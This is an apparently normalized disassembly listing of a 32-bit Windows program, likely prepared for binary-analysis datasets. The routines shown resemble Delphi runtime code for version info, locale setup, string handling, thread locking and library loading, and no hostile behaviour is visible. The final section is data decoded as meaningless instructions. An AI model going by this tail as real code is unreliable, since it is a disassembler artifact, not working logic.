mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40415c
sub_40bf5c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c032
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f84
lea eax [ ebp - 0x8 ]
call j_sub_4043b8#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043ac
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c039
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov eax ebx
call sub_4026f4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043ac
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_402714
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c048
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c0c0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4043ac
mov edx esi
dec edx
call sub_40c048
sub_40c0fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4041ac
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c124
pop esi
pop ebx
retn
mov eax ebx
call sub_4041ac
mov esi eax
sub_40c124
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4041ac
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c334
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c17c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4041ac
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c334
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c334
dec eax
mov ebx eax
sub_40c20c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041ac
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c17c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4041ac
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c270
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041ac
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4041ac
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c17c
mov eax esi
call sub_4041ac
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4041ac
mov [ esp ] eax
jmp r-xdata
sub_40c2f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4043ac
add eax esi
dec eax
call sub_40c2d0
sub_40c334
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4043ac
add eax ebx
dec eax
call sub_40c2d0
add eax ebx
sub_40c370
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4043ac
push eax
mov eax esi
call sub_4043ac
mov ebp eax
mov eax ebp
pop edx
call sub_40c3a8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c3a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408588
mov [ esp ] eax
mov eax ebp
call sub_408588
mov edi eax
mov edx ebp
mov eax esi
call sub_40874c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c0e4
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40874c
mov ebx eax
inc ebx
sub_40c448
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c470
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c470
test eax eax
jne r-xdata
sub_40c470
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408738
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c0e4
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408738
mov edi eax
test edi edi
jne r-xdata
sub_40c4b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c514
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40415c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4080f8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c51b
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_40c524
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c4b0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c59c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c584
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c524
pop ecx
push ebp
call sub_40c524
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402ca4
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c710
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c9db
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c59c
call sub_40b000
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40af50
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f40
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4080f8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4080f8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40af9c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40af9c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4080f8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40af9c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b288
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f40
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b288
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f40
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40af9c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40af50
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f40
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40af50
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_403eec
lea eax [ ebp - 0xc ]
call sub_403eec
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4080f8
test eax eax
jne r-xdata
call sub_40b1d8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40426c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40426c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40af9c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c9e2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f10
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4080f8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40af50
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4080f8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403f84
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403f84
jmp r-xdata
sub_40ca90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cb20
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40af04
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb27
lea eax [ ebp - 0x14 ]
call sub_403eec
retn
sub_40cb78
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408514
mov [ rw-data ] eax
sub_40cbfc
push ebx
push esi
push edi
push ebp
call sub_403528
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402714
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403164
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403510
sub_40cc64
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40cc4c
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ccec
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407c14
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cbec
mov [ ebp ] eax
sub_40ccec
push ebx
mov ebx eax
mov eax ebx
call sub_40cc4c
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cbec
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cd2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_40cda0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_40ce2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403174
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_40ce2c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cde8
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cc64
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cbf4
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cbd4
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cbf4
test eax eax
je r-xdata
mov eax edi
call sub_40cde8
test bl bl
je r-xdata
mov eax edi
call sub_40ce1c
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cbd4
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cbe0
sub_40cec8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc64
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cbf4
mov eax ebx
call sub_40ce00
mov eax ebx
call sub_40cdf4
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ccdc
sub_40cf18
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cc64
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ce0c
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cbe0
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cbd4
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ce0c
mov eax esi
call sub_40ce00
sub_40cf84
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cc64
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ccdc
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cbd4
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ce00
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ce00
sub_40cffc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d020
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d097
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405758
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403228
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d09e
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403228
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cffc
test al al
jne r-xdata
mov al 0x1
sub_40d0b8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d12a
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d10c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4043ac
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d113
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d13c
sbb eax 0x4000000
add eax [ edi ]
inc esp
jno r-xdata
inc edi
add [ edx + eax + 0x70100047 ] dh
add ah bh
add al [ edi ]
push esp
jo r-xdata
inc edi
add [ edx + eax ] ch
inc edi
add [ edx + esi * 2 ] ch
inc edi
add [ edx + eax ] ah
inc edi
add [ eax + esi * 2 ] ah
add [ edx + eax + 0x47 ] dh
add [ edx + esi * 2 + 0x47 ] dh
add [ edx + eax + 0x47 ] ch
add [ eax ] ch
jo r-xdata
inc edi
add [ edx + eax + 0x70180047 ] ch
inc edi
add [ edx + eax + 0x72300047 ] ah
inc edi
add [ edx + eax + 0x70140047 ] bl
inc edi
add [ edx + eax + 0x72b40047 ] dl
inc edi
add [ edx + eax + 0x711c0047 ] cl
inc edi
add [ edx + eax + 0x70f80047 ] al
inc edi
add [ edx + eax + 0x47 ] bh
add al cl
jb r-xdata
add ah dh
add al [ edi ]
aam 0x6e
inc edi
add ah ch
add al [ edi ]
mov [ ecx + 0x47 ] dh
add ah ah
add al [ edi ]
mov eax 0xdc004771
add al [ edi ]
mov [ edi + 0x47 ] ch
add ah dl
add al [ edi ]
cmp al 0x70
inc edi
add ah cl
add al [ edi ]
cwde
outsb
inc edi
add ah al
add al [ edi ]
mov [ eax + 0x47 ] dh
add [ edx + eax + 0x70d80047 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ edi ]
and [ eax + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add ah bh
add [ edi ] eax
sbb [ ecx + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add al bh
add [ edi ] eax
dec eax
outsd
inc edi
add [ eax ] al
add [ eax ] al
add ah dh
add [ edi ] eax
call sub_411a1d
add [ eax ] al
add al dh
add [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add al [ edi ]
loopne r-xdata
inc edi
add [ eax ] ch
add [ eax ] al
add [ edx + eax ] bl
add [ edx + eax + 0x47 ] ah
add [ eax ] bh
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add al dl
add [ edi ] eax
mov al 0x6f
inc edi
add [ eax ] al
add [ eax ] al
add ah cl
add [ edi ] eax
test [ eax + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add al cl
add [ edi ] eax
add al 0x71
inc edi
add [ eax ] al
add [ eax ] al
add ah al
add [ edi ] eax
pushfd
jo r-xdata
add [ eax ] al
add [ eax ] al
add al ch
add [ edi ] eax
xor al 0x71
inc edi
add [ eax ] al
add [ eax ] al
add ah ah
add [ edi ] eax
or al 0x70
inc edi
add [ eax ] al
add [ eax ] al
add al ah
add [ edi ] eax
shr [ edi + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
fadd [ ecx ]
inc edi
add [ esi + ebp * 2 + 0x47 ] ch
add [ eax ] al
fadd [ ecx ]
inc edi
add [ eax + 0x4771 ] ah
add [ eax ] al
add ah dl
add [ edi ] eax
mov eax 0x4770
mov ah 0x71
inc edi
add [ eax ] al
add [ eax ] al
add ah ch
add [ edi ] eax
movsb [ edi ] [ esi ]
jno r-xdata
add [ eax ] al
add [ eax ] al
[ edi ] eax
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ ecx + esi * 2 + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add al [ edi ]
mov al 0x6e
inc edi
add [ eax ] al
inc edi
add [ eax ] dl
jb r-xdata
add [ edx + eax + 0x47 ] bl
add [ edx + esi * 2 + 0x47 ] cl
add [ edx + eax + 0x47 ] dl
add [ edi + ebp * 2 + 0x47 ] ch
add [ edx + eax + 0x47 ] cl
add [ eax ] dh
outsd
inc edi
add [ edx + eax + 0x47 ] al
add al dh
jo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004701 ] ch
outsd
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x6ebc0047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x1fffb8ff ] ah
jno r-xdata
add [ eax ] al
add [ eax ] al
add al al
add [ edi ] eax
in al 0x6f
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + eax + 0x6ea80047 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x48004701 ] bh
jo r-xdata
add [ eax ] al
add [ edx + eax ] cl
inc edi
add [ edi + ebp * 2 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add al [ edi ]
inc esp
outsd
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + eax ] al
